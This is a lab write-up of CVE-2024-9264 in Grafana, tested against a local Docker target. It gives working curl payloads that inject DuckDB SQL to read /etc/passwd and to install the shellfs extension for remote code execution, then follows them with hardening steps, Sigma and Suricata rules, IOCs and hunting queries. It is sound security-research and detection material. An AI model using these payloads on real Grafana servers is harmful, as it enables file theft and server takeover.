# Lab Writeup: Grafana SQL Expressions RCE via DuckDB Injection (CVE-2024-9264)

> **Environment**: Local Docker lab (vulhub/grafana/CVE-2024-9264)
> **Purpose**: Security research & exploit-development practice
> **Status**: ✅ Complete
> **Date**: 2026-05-19

---

## Overview

Grafana 11.0.0–11.2.1 ships an experimental "SQL Expressions" feature that post-processes datasource query results through the DuckDB engine. A bug in the feature-flag implementation enables the API endpoint (`/api/ds/query`) by default even though the UI toggle is off. Any authenticated user (Viewer or higher) can inject arbitrary DuckDB SQL — reading local files via `read_blob()` and achieving RCE by installing the community `shellfs` extension to pipe shell commands through `read_csv()`.

| Item | Detail |
|------|--------|
| CVE | CVE-2024-9264 |
| CVSS | 9.9 (Critical) |
| Type | SQL injection → arbitrary file read + RCE (DuckDB engine) |
| Affected | Grafana 11.0.0–11.0.5, 11.1.0–11.1.6, 11.2.0–11.2.1 |
| Prerequisite | Authenticated user (Viewer+); DuckDB binary in PATH |
| Default port | 3000/tcp |
| Default creds (vulhub) | `admin:admin` |

---

## Attack Chain

```
Authenticated API call → /api/ds/query (SQL expression type)
  → DuckDB evaluates injected SQL
  → read_blob('/etc/passwd')           [file read]
  → INSTALL shellfs; read_csv('cmd |') [RCE]
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd ~/Security/tools/vulhub/grafana/CVE-2024-9264
docker compose up -d
# Web UI: http://127.0.0.1:3000  (admin / admin)
```

### 2. Fingerprinting

```bash
curl -sI http://127.0.0.1:3000/login | grep -i "x-content"
# 200 OK confirms Grafana is running
```

### 3. Arbitrary File Read — DuckDB `read_blob()`

```bash
curl -s -u admin:admin -H "Content-Type: application/json" \
  -X POST "http://127.0.0.1:3000/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100" \
  -d '{"queries":[{"refId":"A","datasource":{"type":"__expr__","uid":"__expr__","name":"Expression"},"type":"sql","expression":"SELECT content FROM read_blob('"'"'/etc/passwd'"'"')"}],"from":"1","to":"2"}'
```

Response contains full `/etc/passwd` with `grafana:x:472:0:` user visible.

### 4. Remote Code Execution — DuckDB `shellfs` extension

Three chained SQL queries in a single request:
- **A**: Install the `shellfs` community extension
- **B**: Load extension + execute command via pipe syntax (`read_csv('cmd |')`)
- **C**: Read command output from temp file

```bash
curl -s -u admin:admin -H "Content-Type: application/json" \
  -X POST "http://127.0.0.1:3000/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100" \
  -d '{"queries":[
    {"refId":"A","datasource":{"type":"__expr__","uid":"__expr__","name":"Expression"},"type":"sql","expression":"SELECT 1;INSTALL shellfs FROM community"},
    {"refId":"B","datasource":{"type":"__expr__","uid":"__expr__","name":"Expression"},"type":"sql","expression":"SELECT 1 FROM A ;LOAD shellfs;SELECT * FROM read_csv('"'"'id > /tmp/rce_out 2>&1 |'"'"', header=false)"},
    {"refId":"C","datasource":{"type":"__expr__","uid":"__expr__","name":"Expression"},"type":"sql","expression":"SELECT b.content FROM A AS a, read_blob('"'"'/tmp/rce_out'"'"') AS b"}
  ],"from":"1","to":"2"}'
```

### 5. Verification

```
Response from query C:
"values": [["uid=472(grafana) gid=0(root) groups=0(root)\x0A"]]
```

**RCE confirmed** — command executed as `grafana` user (gid=0/root group).

---

## Lessons Learned

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| `http_proxy` causes 503 on localhost | system proxy intercepts 127.0.0.1 | `unset http_proxy` before curl |
| Single quotes in JSON payload break shell | nested quoting conflict between bash and JSON | use `'"'"'` (end single-quote, double-quote a single-quote, resume single-quote) |
| `shellfs` INSTALL requires internet | DuckDB fetches extension from community repo | ensure container has outbound access (default docker bridge allows it) |
| Query ordering matters | B must reference A to ensure INSTALL completes first | use `FROM A` in query B to create execution dependency |
| Feature flag "disabled" but API still works | bug in Grafana's feature-flag implementation — API ignores the toggle | this IS the vulnerability; no workaround needed for exploitation |

---

## Defense

Grafana is deployed on nearly every monitoring stack — a single compromised Viewer account turns into full server file read and RCE. The DuckDB integration is the root cause, but the broader lesson is: never expose a query engine to user-controlled input without sandboxing.

### Hardening — reduce the attack surface

1. **Patch to Grafana ≥ 11.0.6 / 11.1.7 / 11.2.2** — the fix removes the SQL Expressions feature entirely from the API path.
2. **Remove DuckDB from PATH** on unpatched instances — without the binary, the SQL expression engine cannot initialize even if the API is reachable.
3. **Restrict API access** — put Grafana behind an authenticating reverse proxy; disable anonymous access and API key creation for non-admin roles.
4. **Principle of least privilege for Grafana users** — Viewer accounts should not exist unless necessary; every Viewer is a potential RCE vector on unpatched instances.
5. **Network egress filter** on the Grafana container — block outbound to `extensions.duckdb.org` to prevent `INSTALL shellfs FROM community` from succeeding.
6. **Read-only filesystem** for the Grafana container (`--read-only` + tmpfs for `/tmp`) — prevents writing command output to disk, breaking the `read_csv('cmd > /tmp/out |')` → `read_blob('/tmp/out')` pattern.

### Detection — spot the exploit in flight

1. **API endpoint monitoring**: POST requests to `/api/ds/query` with `"type":"sql"` in the body from non-dashboard sources (direct curl, scripts) are suspicious. Alert on:
   ```
   url.path:"/api/ds/query" AND request.body CONTAINS "\"type\":\"sql\""
   ```
2. **DuckDB extension installation**: any request body containing `INSTALL shellfs` or `LOAD shellfs` is exploit-grade — no legitimate Grafana workflow uses shell extensions.
3. **File-read patterns**: `read_blob('/etc/` or `read_blob('/proc/` in request bodies indicate file exfiltration attempts.
4. **Process genealogy**: the Grafana process spawning `duckdb` which then spawns `/bin/sh` or pipes to external commands:
   ```yaml
   - rule: Grafana DuckDB spawns shell
     condition: spawned_process and proc.pname=duckdb and proc.name in (bash, sh)
     priority: CRITICAL
   ```
5. **Outbound to DuckDB extension CDN** from the Grafana container — `extensions.duckdb.org` traffic is the INSTALL step.

### Threat Hunting — find the breach after the fact

1. **Grafana access logs**: grep for `POST /api/ds/query` with response size anomalies (file-read responses are much larger than normal expression results).
2. **DuckDB artifacts**: `find / -name "*.duckdb_extension" -o -name "shellfs*" 2>/dev/null` — installed extensions persist on disk.
3. **Temp file IOCs**: `find /tmp -newer /usr/share/grafana/bin/grafana -type f` — command output files written by the exploit chain.
4. **Grafana audit log** (Enterprise): look for `ds/query` API calls from unexpected user IDs or source IPs.
5. **Network flow**: outbound connections from the Grafana container to `extensions.duckdb.org` (extension download) or to attacker C2 (post-RCE pivot).

---

### SOC Artifacts

#### Sigma Rule — DuckDB shellfs payload

```yaml
title: Grafana DuckDB SQL Expression RCE (CVE-2024-9264)
id: e9d8c7b6-a5b4-c3d2-e1f0-9876543210ab
status: experimental
description: Detects Grafana SQL Expressions API abuse via DuckDB shellfs/read_blob
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9264
  - https://grafana.com/security/security-advisories/cve-2024-9264/
logsource:
  category: webserver
detection:
  selection_path:
    cs-uri-stem: '/api/ds/query'
    cs-method: 'POST'
  selection_payload:
    cs-body|contains:
      - 'INSTALL shellfs'
      - 'LOAD shellfs'
      - 'read_blob'
      - 'read_csv('
  condition: selection_path and selection_payload
falsepositives:
  - Internal automation using DuckDB SQL expressions (rare; whitelist by user)
level: critical
tags:
  - attack.execution
  - attack.t1190
  - cve.2024.9264
```

#### Suricata Rule

```
alert http any any -> $HTTP_SERVERS any (msg:"Grafana DuckDB Shellfs Exploit (CVE-2024-9264)";
  flow:to_server,established;
  http.uri; content:"/api/ds/query";
  http.method; content:"POST";
  http.request_body; content:"shellfs"; nocase;
  classtype:attempted-admin; sid:2024009264; rev:1;
  reference:cve,2024-9264;)
```

#### Structured IOCs

| Type | Indicator | Confidence |
|---|---|---|
| API | `POST /api/ds/query` body contains `"type":"sql"` | Medium |
| Payload | `INSTALL shellfs`, `LOAD shellfs`, `read_blob('/etc/...` | Critical |
| Egress | Connection to `extensions.duckdb.org` from Grafana container | High |
| File | `*.duckdb_extension`, `shellfs*` on Grafana host | Medium |
| Process | `grafana-server` → `duckdb` → `bash`/`sh` | Critical |
| User | Viewer-role account submitting `/api/ds/query` requests | High |

#### SIEM Hunting Queries

**Splunk SPL** — query API + duckdb CDN correlation:

```spl
index=grafana sourcetype=access_log uri_path="/api/ds/query" method=POST
| join src_ip [search index=netflow dest="extensions.duckdb.org" earliest=-10m@m]
| table _time src_ip user uri_path
```

**Microsoft Sentinel KQL** — shellfs keyword hunt:

```kql
let suspicious = dynamic(["INSTALL shellfs", "LOAD shellfs", "read_blob", "shellfs_lib"]);
W3CIISLog
| where csUriStem == "/api/ds/query"
| where csMethod == "POST"
| extend body_match = iff(csUriQuery has_any (suspicious), 1, 0)
| where body_match == 1
| project TimeGenerated, cIP, csUserName, csUriQuery
```

**Elastic ES|QL** — duckdb process child:

```esql
FROM logs-endpoint-* | WHERE process.parent.name == "duckdb"
| WHERE process.name IN ("bash", "sh", "dash")
| STATS occurrences = COUNT(*) BY host.name, process.command_line
```

---

## Tools & References

- [vulhub/grafana/CVE-2024-9264](https://github.com/vulhub/vulhub/tree/master/grafana/CVE-2024-9264)
- [Grafana security advisory](https://grafana.com/security/security-advisories/cve-2024-9264/)
- [nollium/CVE-2024-9264 — PoC](https://github.com/nollium/CVE-2024-9264)
- [NVD: CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.
